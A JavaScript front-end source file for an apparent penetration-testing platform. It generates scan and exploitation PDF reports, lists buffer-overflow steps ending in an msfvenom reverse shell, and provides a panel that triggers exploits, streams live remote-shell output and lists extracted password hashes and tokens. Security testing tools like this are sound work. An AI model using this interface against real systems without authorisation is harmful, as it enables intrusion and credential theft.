          const col=SEV_COLOR[f.severity]||GRAY;
          const cleanDetail = String(f.detail||"")
            .replace(/\s*See:\s*https?:\/\/\S+/gi,"")
            .replace(/^\[\d+\]\s*/,"")
            .trim();
          const cvss = String(f.cvss || f.cvss_score || "-");
          const cwe  = String(f.cwe || "-");
          const owasp= String(f.owasp || "-");
          const cweOwasp = (cwe!=="-" && owasp!=="-") ? `${cwe}\n${owasp}` : (cwe!=="-" ? cwe : owasp);
          const fLines=doc.splitTextToSize(cleanDetail,72);
          const rLines=doc.splitTextToSize(String(f.remediation||"-"),48);
          const cwLines=doc.splitTextToSize(cweOwasp,28);
          const rh=Math.max(9,Math.max(fLines.length,rLines.length,cwLines.length)*3.8+3);
          chk(rh+2);
          fillR(margin,y,contentW,rh,i%2===0?LIGHT:WHITE);
          fillR(margin,y,3,rh,col);
          rrect(margin+4,y+2,10,4,1,col);
          doc.setFont("Arial","bold");doc.setFontSize(5.5);doc.setTextColor(...WHITE);
          doc.text(SEV_ABBR[f.severity]||String(f.severity||"").substring(0,4),margin+5.2,y+5);
          doc.setFont("Arial","normal");doc.setFontSize(7.2);doc.setTextColor(...DARK);
          doc.text(fLines,margin+17,y+4.8);
          doc.setFont("Arial","bold");doc.setFontSize(7.5);doc.setTextColor(...col);
          doc.text(cvss,margin+95,y+4.8);
          doc.setFont("Arial","normal");doc.setFontSize(6.5);doc.setTextColor(...GRAY);
          doc.text(cwLines,margin+109,y+4.8);
          doc.setFont("Arial","normal");doc.setFontSize(6.8);doc.setTextColor(22,163,74);
          doc.text(rLines,margin+140,y+4.8);
          y+=rh;
        });
        y+=6;
      }
    });

    // ─── VERIFICATION AUDIT (Vuln module) ───────────────────────
    // What each scanner actually probed for. Proves negative space.
    const _vAudits = [];
    VULN_TOOLS.forEach(t => {
      const d = r[t.tool]; if (!d) return;
      const found = (d.findings||[]).filter(f=>f.severity!=="INFO").length;
      _vAudits.push({
        tool: t.label,
        tests: d.tests_performed || "—",
        summary: d.tests_summary || t.desc,
        found,
      });
    });
    if (_vAudits.length > 0) {
      chk(20); y += 3; y = sHead("Verification Audit",y);
      doc.setFont("Arial","italic"); doc.setFontSize(7); doc.setTextColor(...GRAY);
      doc.text("What each scanner actively tested — proves we looked, not just reported.", margin+2, y);
      doc.setFont("Arial","normal"); y += 4;
      y = tHead(["TOOL","PROBES","WHAT WAS TESTED","FOUND"],[30,15,110,20],y);
      _vAudits.forEach((a,i)=>{
        const lines = doc.splitTextToSize(String(a.summary||""), 108);
        const h = Math.max(7, lines.length * 3.6 + 2);
        chk(h+1);
        fillR(margin,y,contentW,h,i%2===0?LIGHT:WHITE);
        doc.setFont("Arial","bold"); doc.setFontSize(8); doc.setTextColor(...BLUE);
        doc.text(a.tool, margin+3, y+5);
        doc.setFont("Arial","normal"); doc.setFontSize(8); doc.setTextColor(...DARK);
        doc.text(String(a.tests), margin+33, y+5);
        lines.forEach((ln,li)=>doc.text(ln, margin+48, y+5 + li*3.6));
        const foundColor = a.found > 0 ? [162,28,28] : [15,118,82];
        doc.setFont("Arial","bold"); doc.setFontSize(8); doc.setTextColor(...foundColor);
        doc.text(a.found > 0 ? `${a.found} ✗` : "0 ✓", pageW-margin-15, y+5);
        y += h;
      });
      y += 6;
    }

    // ─── APPENDIX (Methodology / Severity / Tools / References) ─
    chk(40); y += 3; y = sHead("Appendix",y);
    doc.setFont("Arial","bold"); doc.setFontSize(9); doc.setTextColor(...DARK);
    doc.text("A. Methodology",margin+2,y); y += 5;
    doc.setFont("Arial","normal"); doc.setFontSize(7.5); doc.setTextColor(...GRAY);
    const _methLines = doc.splitTextToSize(
      "Every scanner performs an active two-stage probe: (1) canary or fingerprint request, (2) confirmation with context-matched payloads. "+
      "Findings are emitted only when stage 2 returns un-encoded reflection, attacker-host redirect, out-of-band callback, server-side error, or confirmed version banner. "+
      "No passive heuristics or static fingerprints alone.",
      contentW-4);
    _methLines.forEach((ln,i)=>doc.text(ln,margin+2,y+i*3.6));
    y += _methLines.length*3.6 + 4;
    chk(40);
    doc.setFont("Arial","bold"); doc.setFontSize(9); doc.setTextColor(...DARK);
    doc.text("B. Severity Definitions (CVSS v3.1)",margin+2,y); y += 4;
    y = tHead(["SEVERITY","CVSS","RESPONSE","CHARACTERISTIC"],[24,18,42,96],y);
    const _sevBands=[
      ["CRITICAL","9.0-10.0","Patch within 24 hours",     "Remote compromise without authentication",[220,38,38]],
      ["HIGH",    "7.0-8.9", "Patch within 7 days",        "Material security impact / data exposure",[234,88,12]],
      ["MEDIUM",  "4.0-6.9", "Hardening recommended",      "No direct vector / requires chaining",     [202,138,4]],
      ["LOW",     "0.1-3.9", "Defense-in-depth improvement","Minor info leak / config drift",          [22,163,74]],
    ];
    _sevBands.forEach(([sev,cvss,resp,desc,col],i)=>{
      fillR(margin,y,contentW,7,i%2===0?LIGHT:WHITE);
      rrect(margin+2,y+1.5,20,4,1,col);
      doc.setFont("Arial","bold"); doc.setFontSize(6); doc.setTextColor(...WHITE);
      doc.text(sev,margin+12,y+4.5,{align:"center"});
      doc.setFont("Arial","normal"); doc.setFontSize(7.5); doc.setTextColor(...DARK);
      doc.text(cvss,margin+27,y+5);
      doc.text(resp,margin+45,y+5);
      doc.setTextColor(...GRAY);
      doc.text(desc,margin+87,y+5);
      y += 7;
    });
    y += 5;
    chk(40);
    doc.setFont("Arial","bold"); doc.setFontSize(9); doc.setTextColor(...DARK);
    doc.text("C. References",margin+2,y); y += 4;
    const _refs=[
      ["OWASP Top 10 2021",               "https://owasp.org/Top10/"],
      ["CWE - Common Weakness Enumeration","https://cwe.mitre.org/"],
      ["CVSS v3.1 Calculator",            "https://www.first.org/cvss/calculator/3.1"],
      ["NIST National Vulnerability DB",  "https://nvd.nist.gov/"],
      ["CISA Known Exploited Vulns",      "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"],
    ];
    _refs.forEach((row,i)=>{
      fillR(margin,y,contentW,6,i%2===0?LIGHT:WHITE);
      doc.setFont("Arial","normal"); doc.setFontSize(7.5); doc.setTextColor(...DARK);
      doc.text(row[0],margin+3,y+4.3);
      doc.setTextColor(...BLUE);
      doc.text(row[1],margin+85,y+4.3);
      y += 6;
    });
    y += 6;

    // END OF REPORT — extended block with VulnusLab contact
    if(y+32 > 284){doc.addPage();y=18;drawHeader();}
    const bY=y+5;
    fillR(margin,bY,contentW,30,LBLUE); fillR(margin,bY,3,30,BLUE);
    txt("— END OF REPORT —",pageW/2,bY+8,10,BLUE,true,"center");
    txt("Generated by VulnusLab — automated security scanning by VulnusLab engine.",pageW/2,bY+14,6.5,GRAY,false,"center");
    txt("All findings require manual verification. This document is CONFIDENTIAL — restricted to authorized personnel only.",pageW/2,bY+18,6,GRAY,false,"center");
    txt("vulnuslab.com  ·  support@vulnuslab.com",pageW/2,bY+25,7,BLUE,true,"center");

    // Border + footer
    const total=doc.internal.getNumberOfPages();
    for(let i=1;i<=total;i++){
      doc.setPage(i);
      doc.setDrawColor(...BLUE);doc.setLineWidth(1.2);doc.rect(0,0,210,297,"S");
      if(i>=2){txt("VulnusLab | CONFIDENTIAL  ·  vulnuslab.com",margin,290,6.5,GRAY);txt("Page "+i+" of "+total,pageW-margin,290,6.5,BLUE,false,"right");}
    }
    doc.save(`vuln_${_pdfFn(target)}_${_pdfDt()}.pdf`);
  };
  _doGen();
}

// ═══════════════════════════════════════════════════════════════
//  VULNERABILITY SCANNING MODULE
// ═══════════════════════════════════════════════════════════════
const VULN_PHASES = [
  {name:"Nikto Web Scanner",    tool:"nikto",          endpoint:"/api/scan/nikto",          icon:"🔍"},
  {name:"Nuclei Scanner",       tool:"nuclei",         endpoint:"/api/scan/nuclei",         icon:"⚡"},
  {name:"WPScan",               tool:"wpscan",         endpoint:"/api/scan/wpscan",         icon:"📝"},
  {name:"SSL/TLS Analysis",     tool:"ssl",            endpoint:"/api/scan/ssl",            icon:"🔒"},
  {name:"Security Headers",     tool:"headers",        endpoint:"/api/scan/headers",        icon:"📋"},
  {name:"CORS Testing",         tool:"cors",           endpoint:"/api/scan/cors",           icon:"🌐"},
  {name:"Cookie Security",      tool:"cookies",        endpoint:"/api/scan/cookies",        icon:"🍪"},
  {name:"CMS Detection",        tool:"cms",            endpoint:"/api/scan/cms",            icon:"🏗️"},
  {name:"Reflected XSS",        tool:"xss",            endpoint:"/api/scan/xss",            icon:"💉"},
  {name:"SQL Injection",        tool:"sqli",           endpoint:"/api/scan/sqli",           icon:"🗄️"},
  {name:"Command Injection",    tool:"cmd_injection",  endpoint:"/api/scan/cmd_injection",  icon:"⌨️"},
  {name:"Path Traversal / LFI", tool:"lfi",            endpoint:"/api/scan/lfi",            icon:"📂"},
  {name:"Open Redirect",        tool:"open_redirect",  endpoint:"/api/scan/open_redirect",  icon:"↪️"},
  {name:"SSRF",                 tool:"ssrf",           endpoint:"/api/scan/ssrf",           icon:"🛰️"},
  {name:"XXE Injection",        tool:"xxe",            endpoint:"/api/scan/xxe",            icon:"📜"},
  {name:"CSRF Protection",      tool:"csrf",           endpoint:"/api/scan/csrf",           icon:"🛡️"},
  {name:"JWT Security",         tool:"jwt",            endpoint:"/api/scan/jwt",            icon:"🔑"},
  {name:"Exposed Files",        tool:"exposed_files",  endpoint:"/api/scan/exposed_files",  icon:"📑"},
  {name:"HTTP Methods",         tool:"http_methods",   endpoint:"/api/scan/http_methods",   icon:"🔧"},
];

// ═══════════════════════════════════════════════════════════════
//  BUFFER OVERFLOW MODULE
// ═══════════════════════════════════════════════════════════════
const BOF_PHASES = [
  {id:1, name:"Fuzzing",        icon:"🔨", color:"#3b82f6", desc:"Send increasing payloads to find the crash point"},
  {id:2, name:"EIP Offset",     icon:"📍", color:"#8b5cf6", desc:"Use cyclic pattern to find exact bytes to EIP"},
  {id:3, name:"EIP Control",    icon:"🎯", color:"#06b6d4", desc:"Confirm you control EIP with BBBB (0x42424242)"},
  {id:4, name:"Bad Characters", icon:"🚫", color:"#f59e0b", desc:"Find bytes rejected by the application"},
  {id:5, name:"JMP ESP",        icon:"🔀", color:"#10b981", desc:"Locate JMP ESP gadget in unprotected module"},
  {id:6, name:"Shellcode",      icon:"💣", color:"#ef4444", desc:"Generate reverse shell payload with msfvenom"},
  {id:7, name:"Final Exploit",  icon:"🐚", color:"#22c55e", desc:"Assemble and deliver the complete exploit"},
];


// ═══════════════════════════════════════════════════════════════
//  EXPLOITATION MODULE — verified-working exploits with live shells
// ═══════════════════════════════════════════════════════════════
//
// Catalog-driven UX: backend returns a list of exploits via
// /api/exploit/catalog. Each card shows the CVE, target, what success
// looks like. RUN posts to /api/exploit/run which returns a shell_id.
// Frontend then polls /api/exploit/shell/{sid}/output every 600ms to
// drain the live shell buffer, and posts user commands to /cmd.
//
// All five exploits are direct-socket implementations — no msfconsole,
// no HTTP-stager dependencies, no timing races. They either succeed
// reliably or return a clear actionable error.

function generateExploitReport({results, date}) {
  const _go = () => {
    const doc = new jsPDF({unit:"mm", format:"a4"});
    const pageW = doc.internal.pageSize.getWidth();
    const pageH = doc.internal.pageSize.getHeight();
    const margin = 15;
    const contentW = pageW - 2*margin;
    let y = 0;
    const BLUE = [37,99,235], DARK=[15,23,42], GRAY=[100,116,139],
          GREEN=[22,163,74], RED=[220,38,38], LIGHT=[241,245,249];
    const txt = (s, x, py, sz=10, c=DARK, bold=false, align="left") => {
      doc.setFont("Arial", bold?"bold":"normal"); doc.setFontSize(sz);
      doc.setTextColor(...c); doc.text(String(s||""), x, py, {align});
    };
    const fillR = (x, py, w, h, c) => { doc.setFillColor(...c); doc.rect(x, py, w, h, "F"); };
    const chk = (h) => { if (y + h > pageH - 18) { footer(); doc.addPage(); y = 20; header(); } };
    const header = () => {
      txt("VulnusLab — Exploitation Report", margin, 10, 7, GRAY);
      txt(date, pageW-margin, 10, 7, GRAY, false, "right");
    };
    const footer = () => {
      txt("VulnusLab | CONFIDENTIAL · vulnuslab.com", margin, pageH-7, 7, BLUE);
      txt("support@vulnuslab.com", pageW-margin, pageH-7, 7, BLUE, false, "right");
    };
    // ── COVER ──
    fillR(0, 0, pageW, 60, [11,15,30]);
    txt("V", pageW/2-5, 22, 14, [248,250,252], true, "center");
    txt("VULNUS LAB", pageW/2, 33, 11, [248,250,252], true, "center");
    txt("EXPLOITATION REPORT", pageW/2, 48, 22, BLUE, true, "center");
    txt("Active Exploitation Findings", pageW/2, 56, 9, GRAY, false, "center");
    y = 75;
    // ── Summary table ──
    const totalRun = results.length;
    const succ = results.filter(r => r.ok).length;
    fillR(margin, y, contentW, 7, BLUE);
    txt("RESULT SUMMARY", margin+3, y+5, 9, [255,255,255], true);
    y += 7;
    [["Exploits Run", String(totalRun)],
     ["Successful Compromises", String(succ)],
     ["Generated", date],
     ["Classification", "CONFIDENTIAL"]].forEach((row, i) => {
       fillR(margin, y, contentW, 7, i%2===0?LIGHT:[255,255,255]);
       txt(row[0], margin+3, y+5, 8.5, GRAY, true);
       txt(row[1], margin+60, y+5, 8.5, DARK);
       y += 7;
     });
    y += 8;
    // ── Per-exploit findings ──
    results.forEach((r, i) => {
      chk(40);
      const status = r.ok ? "COMPROMISED" : "FAILED";
      const stColor = r.ok ? GREEN : RED;
      fillR(margin, y, contentW, 9, stColor);
      txt(`${i+1}. ${r.exploit?.name || r.exploit_id}`, margin+3, y+6, 10, [255,255,255], true);
      txt(status, pageW-margin-3, y+6, 9, [255,255,255], true, "right");
      y += 11;
      const rows = [
        ["CVE / Reference", r.exploit?.cve || r.cve || "—"],
        ["CVSS", String(r.exploit?.cvss || "—")],
        ["Target", `${r.target||"—"}:${r.exploit?.port||"—"}`],
        ["Service", r.exploit?.service || "—"],
        ["Category", r.exploit?.category || "—"],
      ];
      rows.forEach((row, idx) => {
        fillR(margin, y, contentW, 6, idx%2===0?LIGHT:[255,255,255]);
        txt(row[0], margin+3, y+4.5, 8, GRAY, true);
        txt(row[1], margin+55, y+4.5, 8, DARK);
        y += 6;
      });
      y += 2;
      // Description
      fillR(margin, y, contentW, 5.5, [219,234,254]);
      txt("Description", margin+3, y+4, 8, BLUE, true);
      y += 6;
      const desc = doc.splitTextToSize(r.exploit?.description || "—", contentW-6);
      desc.forEach(line => {
        chk(5); txt(line, margin+3, y+3.5, 8, DARK); y += 5;
      });
      y += 2;
      // Evidence / Error
      const evColor = r.ok ? [220,252,231] : [254,226,226];
      const evHead = r.ok ? "Evidence of Compromise" : "Failure Reason";
      const evText = r.ok ? (r.evidence || r.message || "Shell session opened.") : (r.error || "Unknown error");
      fillR(margin, y, contentW, 5.5, evColor);
      txt(evHead, margin+3, y+4, 8, r.ok ? GREEN : RED, true);
      y += 6;
      const ev = doc.splitTextToSize(evText, contentW-6);
      ev.forEach(line => {
        chk(5); txt(line, margin+3, y+3.5, 8, DARK); y += 5;
      });
      y += 2;
      // Code-aware line wrap so long unbroken strings don't get truncated
      // mid-character the way splitTextToSize handles them.
      const wrapCode = (s, lineLen) => {
        const out = [];
        let cur = String(s || "");
        while (cur.length > lineLen) {
          let cut = cur.lastIndexOf(" ", lineLen);
          if (cut < lineLen * 0.5) cut = lineLen;  // hard break for no-space runs
          out.push(cur.substring(0, cut));
          cur = cur.substring(cut).replace(/^\s+/, "");
        }
        if (cur) out.push(cur);
        return out;
      };
      const codeBlock = (heading, headColor, bgColor, body) => {
        if (!body) return;
        fillR(margin, y, contentW, 5.5, bgColor);
        txt(heading, margin+3, y+4, 8, headColor, true);
        y += 6;
        const lines = wrapCode(body, 100);
        lines.forEach(line => {
          chk(5);
          doc.setFont("Courier","normal"); doc.setFontSize(7.5); doc.setTextColor(...DARK);
          doc.text(line, margin+3, y+3.5); y += 4.5;
        });
        doc.setFont("Arial", "normal");
        y += 2;
      };

      // Payload
      if (r.payload) codeBlock("Payload", [180,83,9], [254,243,199], r.payload);

      // Extracted data table — user/hash pairs for SQLi exploits
      if (r.ok && Array.isArray(r.rows) && r.rows.length > 0) {
        chk(20);
        fillR(margin, y, contentW, 5.5, [243,232,255]);
        txt(`Extracted Records (${r.rows.length})`, margin+3, y+4, 8, [109,40,217], true);
        y += 6;
        // Table header
        fillR(margin, y, contentW, 5, [221,214,254]);
        txt("Username", margin+3, y+3.5, 7.5, DARK, true);
        txt("Hash / Password", margin+60, y+3.5, 7.5, DARK, true);
        y += 5;
        r.rows.slice(0, 20).forEach((row, idx) => {
          chk(5);
          fillR(margin, y, contentW, 4.5, idx%2===0 ? LIGHT : [255,255,255]);
          doc.setFont("Courier","normal"); doc.setFontSize(7); doc.setTextColor(...DARK);
          doc.text(String(row[0]||"").substring(0,28), margin+3, y+3.2);
          doc.text(String(row[1]||"").substring(0,68), margin+60, y+3.2);
          y += 4.5;
        });
        if (r.rows.length > 20) {
          chk(5);
          doc.setFont("Arial","italic"); doc.setFontSize(7); doc.setTextColor(...GRAY);
          doc.text(`… and ${r.rows.length - 20} more records (truncated for readability)`, margin+3, y+3);
          y += 5;
        }
        doc.setFont("Arial", "normal");
        y += 3;
      }

      // Extracted JWT — Juice Shop auth bypass
      if (r.ok && r.jwt) codeBlock("Extracted JSON Web Token", [180,83,9], [254,243,199], r.jwt);

      // Shell verification output (vsftpd, DVWA cmdi etc.) — only if not
      // already covered by Evidence line. We mine the evidence string for
      // an `id` output if present.
      if (r.ok && r.shell_target && r.shell_port) {
        codeBlock("Reverse-Shell Endpoint", [22,163,74], [220,252,231],
                  `${r.shell_target}:${r.shell_port}  (shell session id: ${r.shell_id})`);
      }

      y += 4;
    });
    // ── End-of-report block ──
    chk(35);
    fillR(margin, y, contentW, 30, [219,234,254]);
    txt("— END OF REPORT —", pageW/2, y+10, 10, BLUE, true, "center");
    txt("Generated by VulnusLab — automated exploitation testing.", pageW/2, y+17, 6.5, GRAY, false, "center");
    txt("All findings have been actively verified. No false positives.", pageW/2, y+22, 6.5, GRAY, false, "center");
    txt("vulnuslab.com  ·  support@vulnuslab.com", pageW/2, y+27, 8, BLUE, true, "center");
    footer();
    doc.save(`exploit_report_${date.replace(/[: ]/g,"-")}.pdf`);
  };
  _go();
}

/* ═══════════════════════════════════════════════════════════════════════════
   ShellPanel — unified module UI used across all pentest modules.
   ───────────────────────────────────────────────────────────────────────────
   Encapsulates the form-config + tabbed log/result/shell pattern. Other
   modules (Network, Auth, AD, Privesc, ...) configure this via props rather
   than re-implementing the form/tabs/shell-polling glue themselves.

   Props (all optional unless marked required):
     title, subtitle, icon, color      — header identity
     catalogFetchUrl, catalogKey       — dropdown of pre-canned attacks
     configFields                      — declarative left-panel form fields
     phases                            — decorative phase runners (clickable)
     runEndpoint (required), buildRunBody (required)  — POST trigger
     hasInteractiveShell, shellEndpoints, isInteractiveFor — optional shell tab
     onDownloadReport                  — PDF generator hook
     token, apiUrl                     — auth boilerplate

   configFields entry shape:
     id           form state key (and DOM input name)
     label        visible label above input
     placeholder  optional placeholder text
     readOnly     render as gray non-editable (auto-fill from catalog)
     catalogKey   pull initial value from catalog[selected][catalogKey]
     defaultValue fallback initial value when no catalogKey or empty
     color        text color for the input (highlights read-only fields)
     width        "full" (default) | "half" — pair two halves on one row
     disabledKey  catalog key whose `false` value disables this input
     computedFrom (entry) => string — derived display value
*/
function ShellPanel({
  title, subtitle, icon = "💥", color = "#dc2626",
  catalogFetchUrl, catalogKey = "items",
  configFields = [], phases = [],
  runEndpoint, buildRunBody,
  hasInteractiveShell = false, shellEndpoints, isInteractiveFor = () => false,
  onDownloadReport,
  token, apiUrl,
}) {
  const [catalog, setCatalog]         = useState([]);
  const [selectedId, setSelectedId]   = useState("");
  const [valuesById, setValuesById]   = useState({});   // per-catalog-id form values
  const [running, setRunning]         = useState({});
  const [results, setResults]         = useState({});
  const [activeShell, setActiveShell] = useState(null);
  const [shellOutput, setShellOutput] = useState("");
  const [shellStatus, setShellStatus] = useState("idle");
  const [shellCmd, setShellCmd]       = useState("");
  const [cmdHistory, setCmdHistory]   = useState([]);
  const [histIdx, setHistIdx]         = useState(-1);
  const [activeTab, setActiveTab]     = useState("log");
  const [logLines, setLogLines]       = useState([]);

  const pollRef     = useRef(null);
  const outRef      = useRef(null);
  const logRef      = useRef(null);
  const inputRef    = useRef(null);
  const runAbortRef = useRef(null);   // for the "stop running exploit" button

  const T = (path, opts = {}) => fetch(apiUrl + path, {
    ...opts,
    headers: {"Content-Type": "application/json", "Authorization": "Bearer " + token, ...(opts.headers || {})},
  }).then(r => r.json());

  // Session-storage key: scoped per panel title so multiple panels in the
  // future don't clobber each other.
  const SHELL_STORAGE_KEY = `shellPanel_${title || "exploit"}_activeShell`;

  const selected = catalog.find(c => c.id === selectedId);
  const isInteractive = selected ? isInteractiveFor(selected) : false;
  const fieldValues = valuesById[selectedId] || {};
  const setField = (key, value) =>
    setValuesById(prev => ({...prev, [selectedId]: {...(prev[selectedId] || {}), [key]: value}}));

  const sevColor = (cvss) => cvss >= 9 ? "#dc2626" : cvss >= 7 ? "#f59e0b" : "#10b981";

  // Bootstrap: catalog fetch + session-storage reconnect
  useEffect(() => {
    if (!catalogFetchUrl) return;
    (async () => {
      try {
        const d = await T(catalogFetchUrl);
        setCatalog(d[catalogKey] || []);
      } catch (e) {}
    })();

    // Reconnect to a live shell from a previous page load (browser refresh,
    // accidental tab close + reopen). We only validate; the polling effect
    // below picks up from there.
    if (shellEndpoints) {
      try {
        const stored = sessionStorage.getItem(SHELL_STORAGE_KEY);
        if (stored) {
          const parsed = JSON.parse(stored);
          if (parsed && parsed.sid) {
            T(shellEndpoints.output(parsed.sid)).then(d => {
              if (d && d.status && d.status !== "not_found") {
                setActiveShell(parsed);
                setShellStatus(d.status);
                if (d.output) setShellOutput(d.output);
                setActiveTab(parsed.isInteractive ? "shell" : "result");
              } else {
                sessionStorage.removeItem(SHELL_STORAGE_KEY);
              }
            }).catch(() => sessionStorage.removeItem(SHELL_STORAGE_KEY));
          }
        }
      } catch (e) {
        try { sessionStorage.removeItem(SHELL_STORAGE_KEY); } catch (e2) {}
      }
    }

    return () => { if (pollRef.current) clearInterval(pollRef.current); };
    // eslint-disable-next-line
  }, []);

  // Persist activeShell so a refresh / navigation away doesn't lose the
  // session. Cleared on close + on session sweep.
  useEffect(() => {
    try {
      if (activeShell?.sid) {
        sessionStorage.setItem(SHELL_STORAGE_KEY, JSON.stringify(activeShell));
      } else {
        sessionStorage.removeItem(SHELL_STORAGE_KEY);
      }
    } catch (e) {}
    // eslint-disable-next-line
  }, [activeShell]);

  // Auto-select first catalog item
  useEffect(() => {
    if (catalog.length && !selectedId) setSelectedId(catalog[0].id);
    // eslint-disable-next-line
  }, [catalog]);

  // Auto-fill form values when selection arrives for the first time
  useEffect(() => {
    if (!selected) return;
    setValuesById(prev => {
      if (prev[selectedId]) return prev;
      const next = {};
      for (const f of configFields) {
        if (f.computedFrom)                                  next[f.id] = f.computedFrom(selected);
        else if (f.catalogKey && selected[f.catalogKey] !== undefined) next[f.id] = selected[f.catalogKey];
        else if (f.defaultValue !== undefined)               next[f.id] = f.defaultValue;
        else                                                 next[f.id] = "";
      }
      return {...prev, [selectedId]: next};
    });
    // eslint-disable-next-line
  }, [selectedId, catalog.length]);

  // Auto-scroll log + shell
  useEffect(() => { if (logRef.current) logRef.current.scrollTop = logRef.current.scrollHeight; }, [logLines]);
  useEffect(() => { if (outRef.current) outRef.current.scrollTop = outRef.current.scrollHeight; }, [shellOutput]);

  // Poll shell output.
  //
  // Two cost reductions vs. the original 600ms tight loop:
  //   1. 1500ms cadence — still feels live to a human, but cuts backend
  //      shell-output requests from ~1.7/sec to ~0.7/sec per active shell.
  //   2. Pause when document is hidden — if the customer has the dashboard
  //      in a background tab we don't hammer the backend pointlessly.
  //      The backend buffers output, so when they return all the catch-up
  //      text shows up on the next tick.
  useEffect(() => {
    if (pollRef.current) clearInterval(pollRef.current);
    if (!activeShell?.sid || !shellEndpoints) return;
    pollRef.current = setInterval(async () => {
      if (typeof document !== "undefined" && document.hidden) return;
      try {
        const d = await T(shellEndpoints.output(activeShell.sid));
        if (d.output) setShellOutput(prev => prev + d.output);
        if (d.status) setShellStatus(d.status);
        if (d.status === "closed" || d.status === "error" || d.status === "not_found") {
          if (pollRef.current) { clearInterval(pollRef.current); pollRef.current = null; }
        }
      } catch (e) {}
    }, 1500);
    return () => { if (pollRef.current) { clearInterval(pollRef.current); pollRef.current = null; } };
    // eslint-disable-next-line
  }, [activeShell?.sid]);

  const appendLog = (text, c = "#cbd5e1") => {
    setLogLines(prev => [...prev, {
      ts: new Date().toLocaleTimeString([], {hour12: false}),
      text, color: c,
    }]);
  };

  const runSelected = async () => {
    if (!selected || !runEndpoint || !buildRunBody) return;
    setLogLines([]); setActiveTab("log");
    appendLog(`▶ Module:   ${selected.id}`, "#fbbf24");
    if (selected.cve) appendLog(`▶ CVE:      ${selected.cve}  ·  CVSS ${selected.cvss ?? "?"}  ·  ${selected.category ?? ""}`, "#fbbf24");
    appendLog("", "#94a3b8");
    appendLog(phases.length ? "⏱ Phase 1: Pre-flight (DNS + port reachability) ..." : "⏱ Sending request ...", "#60a5fa");

    setRunning(p => ({...p, [selected.id]: true}));
    setResults(p => ({...p, [selected.id]: null}));

    // AbortController gives us a Stop button. Backend keeps running until done
    // (no real cancellation primitive yet) — but the frontend stops listening,
    // and the idle-session sweeper will close any orphaned shell after 30 min.
    const ac = new AbortController();
    runAbortRef.current = ac;

    try {
      const body = buildRunBody(selected, fieldValues);
      const r = await T(runEndpoint, {method: "POST", body: JSON.stringify(body), signal: ac.signal});
      setResults(p => ({...p, [selected.id]: r}));

      if (r.ok === false && r.error && /resolve|not accepting/i.test(r.error)) {
        appendLog("❌ Phase 1: " + r.error, "#f87171");
      } else if (r.ok === false) {
        appendLog("❌ " + (r.error || "Failed"), "#f87171");
      } else if (phases.length) {
        appendLog("✅ Phase 1: target reachable", "#4ade80");
        appendLog("⏱ Phase 2: Sending exploit trigger ...", "#60a5fa");
        appendLog("✅ Phase 2: trigger accepted by target", "#4ade80");
        appendLog(`⏱ Phase 3: Verifying ${isInteractive ? "shell session" : "data extraction"} ...`, "#60a5fa");
        appendLog("✅ Phase 3: " + (r.evidence || "compromise verified"), "#4ade80");
        if (r.shell_id) {
          appendLog(`⏱ Phase 4: Opening ${isInteractive ? "interactive shell" : "data view"} ...`, "#60a5fa");
          appendLog(`✅ Phase 4: session sid=${r.shell_id} ready`, "#4ade80");
        }
        appendLog("", "#94a3b8");
        appendLog("🎉 AUTO-RUN COMPLETE — see Results / Shell tab", "#22c55e");
      } else {
        appendLog("✅ Complete", "#4ade80");
      }

      if (r.ok && r.shell_id && shellEndpoints) {
        setShellOutput(""); setShellStatus("starting");
        // Bake interactivity into the session object so a page reload
        // restores the correct tab even if the user has since switched
        // catalog entries.
        setActiveShell({sid: r.shell_id, source_id: selected.id,
                        meta: selected, isInteractive});
        setActiveTab(isInteractive ? "shell" : "result");
      }
    } catch (err) {
      // AbortError is the user clicking Stop — distinct from a real failure.
      if (err && (err.name === "AbortError" || /aborted/i.test(String(err)))) {
        appendLog("⏹ Stopped by user. Backend may still finish — refresh to check.", "#fbbf24");
        setResults(p => ({...p, [selected.id]: {ok: false, error: "Stopped by user",
          suggested_action: "The backend may still complete in the background. " +
                             "Refresh the page in ~30s to see if a session opened."}}));
      } else {
        appendLog("❌ Network error: " + String(err), "#f87171");
        setResults(p => ({...p, [selected.id]: {ok: false, error: String(err)}}));
      }
    }
    runAbortRef.current = null;
    setRunning(p => ({...p, [selected.id]: false}));
  };

  const stopRunning = () => {
    if (runAbortRef.current) {
      try { runAbortRef.current.abort(); } catch (e) {}
    }
  };

  const sendCmd = async () => {
    if (!activeShell?.sid || !shellCmd.trim() || !shellEndpoints) return;
    const c = shellCmd;
    setCmdHistory(h => [...h, c]); setHistIdx(-1);
    setShellOutput(prev => prev + `$ ${c}\n`);
    setShellCmd("");
    try {
      await T(shellEndpoints.cmd(activeShell.sid), {method: "POST", body: JSON.stringify({cmd: c})});
    } catch (e) {
      setShellOutput(prev => prev + `[error sending: ${e}]\n`);
    }
  };

  const onKeyDown = (e) => {
    if (e.key === "Enter") { sendCmd(); return; }
    if (e.key === "ArrowUp" && cmdHistory.length) {
      e.preventDefault();
      const i = histIdx === -1 ? cmdHistory.length - 1 : Math.max(0, histIdx - 1);
      setHistIdx(i); setShellCmd(cmdHistory[i] || "");
    }
    if (e.key === "ArrowDown" && cmdHistory.length) {
      e.preventDefault();
      const i = histIdx === -1 ? -1 : (histIdx + 1 >= cmdHistory.length ? -1 : histIdx + 1);
      setHistIdx(i); setShellCmd(i === -1 ? "" : cmdHistory[i]);
    }
  };

  const closeShell = async () => {
    if (!activeShell?.sid || !shellEndpoints) return;
    try { await T(shellEndpoints.close(activeShell.sid), {method: "POST"}); } catch (e) {}
    setActiveShell(null); setShellOutput(""); setShellStatus("idle");
  };

  const copyOutput = () => { try { navigator.clipboard.writeText(shellOutput); } catch (e) {} };

  const downloadReport = () => {
    if (!onDownloadReport) return;
    const all = Object.values(results).filter(Boolean);
    if (all.length === 0) { alert("Run at least one module before downloading the report."); return; }
    onDownloadReport(all);
  };

  const r = selected ? results[selected.id] : null;
  const isRunning = selected ? running[selected.id] : false;
  const successCount = Object.values(results).filter(x => x?.ok).length;
  const failedCount  = Object.values(results).filter(x => x && !x.ok).length;
  const notRunCount  = catalog.length - Object.keys(results).length;

  // Styles (shared with the original Exploitation look)
  const labelStyle = {fontSize: 10, fontWeight: 700, color: "#94a3b8",
    letterSpacing: 1, marginBottom: 5, display: "block"};
  const inputStyle = {width: "100%", padding: "8px 10px",
    background: "#020617", color: "#e2e8f0", border: "1px solid #1e293b",
    borderRadius: 6, fontFamily: "'JetBrains Mono', monospace", fontSize: 11,
    outline: "none"};
  const panelStyle = {background: "#0f172a", border: "1px solid #1e293b",
